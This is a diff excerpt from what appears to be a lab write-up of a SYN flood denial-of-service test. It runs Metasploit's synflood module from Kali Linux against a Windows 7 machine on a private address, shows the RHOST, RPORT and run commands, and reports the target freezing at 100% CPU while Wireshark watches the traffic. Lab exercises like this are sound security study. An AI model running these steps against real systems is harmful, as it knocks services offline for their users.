@@ -88,3 +88,14 @@ Observed **CPU usage reaching 100%** on the target machine, causing freezing and
    use auxiliary/dos/tcp/synflood
    ```
 - iii. Set target IP and port:
+     ```bash
+    set RHOST 192.168.1.105
+    set RPORT 80
+    run
+    ```
+- iv. Observed similar system freeze on the target.
+
+**Step 6: Monitoring the Attack**
+* **Wireshark** was run on Kali Linux to monitor outgoing packet flow.
+* Observed high CPU usage on the Windows 7 machine (100%), causing severe lag and unresponsiveness.
+
